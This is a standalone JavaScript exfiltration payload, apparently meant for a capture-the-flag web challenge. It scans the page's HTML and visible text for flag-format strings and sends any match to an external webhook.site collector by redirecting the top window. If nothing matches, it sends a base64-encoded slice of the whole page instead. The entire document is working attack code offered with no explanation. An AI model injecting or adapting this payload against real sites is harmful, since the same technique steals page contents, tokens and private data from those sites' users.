(async () => {
  const exfil = (tag, value) => {
    top.location =
      'https://webhook.site/TU-ID?tag=' +
      encodeURIComponent(tag) +
      '&d=' +
      encodeURIComponent(value);
  };

  const pats = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon[a-z_]*\{[^}]+\}/i
  ];

  const findFlag = (txt) => {
    if (!txt) return null;
    for (const re of pats) {
      const m = txt.match(re);
      if (m) return m[0];
    }
    return null;
  };

  try {
    const html = document.documentElement.outerHTML;
    const hit = findFlag(html);
    if (hit) {
      exfil('dom_flag', hit);
      return;
    }
  } catch (e) {}

  try {
    const text = document.body ? document.body.innerText : '';
    const hit = findFlag(text);
    if (hit) {
      exfil('body_flag', hit);
      return;
    }
  } catch (e) {}

  try {
    exfil('html_b64', btoa(document.documentElement.outerHTML).slice(0, 1800));
  } catch (e) {}
})();
